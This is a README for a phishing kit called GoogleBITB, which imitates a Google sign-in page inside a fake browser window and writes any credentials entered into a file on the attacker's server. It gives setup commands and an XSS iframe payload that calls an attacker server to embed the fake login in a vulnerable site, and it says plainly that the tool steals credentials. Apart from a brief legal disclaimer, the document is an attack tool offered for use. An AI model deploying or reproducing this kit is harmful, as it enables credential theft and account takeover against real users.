# GoogleBITB

This repo contains a fake two-part Google Login implemented within a Browser-In-The-Browser attack window. It can be used on a web server that supports PHP files. Any entered credentials are saved in <i>/opt/GoogleBITB/creds.txt</i>. The Domain Suffix can be changed from <b>@client.com</b> to any site of your choosing (to do this, just edit line 21 of login_page.html). Follow steps below for a quick and easy setup.

<p align='center'>
<img alt='Email Page' src='http://165.227.79.102/img/4.png?q=1' style='width:800px;'/>
</p>

Legal Disclaimer: Usage of this repo for attacking targets without prior consent is illegal. It is the end user's responsiblity to obey applicable local, state and federal laws. Developer assumes no liability for any misuse or damage caused by this repo.

### Get Started

Run the below commands in the <b>/var/www/html</b> folder of your web server.

```
git clone https://github.com/jakedmurphy1/GoogleBITB.git
```

```
cd GoogleBITB
```

```
chmod 666 creds.txt
```
Move the credentials file into a non-public folder:
```
mkdir /opt/GoogleBITB && mv creds.txt /opt/GoogleBITB/creds.txt
```

Then visit <i>/GoogleBITB/index.html</i> in your browser and give it a try! Any gathered credentials will be stored in <i>/opt/GoogleBITB/creds.txt</i>

### Getting Creds from a XSS Attack

You can use this repo to steal credentials through a XSS attack. Just set it up and use the following XSS payload:
```
<iframe style='border:none;width:100%;height:100%' scrolling='no' src='https://[ATTACKER_SERVER]/GoogleBITB/index.html'/>
```
<i> Be sure to have HTTPS on your server or the iframe will not render.</i>

This payload will create a frame within frame (inception) prompting the user to sign in from what appears to be the vulnerable application. 

### Sources
https://github.com/jakedmurphy1/GooglePhishing

https://github.com/mrd0x/BITB
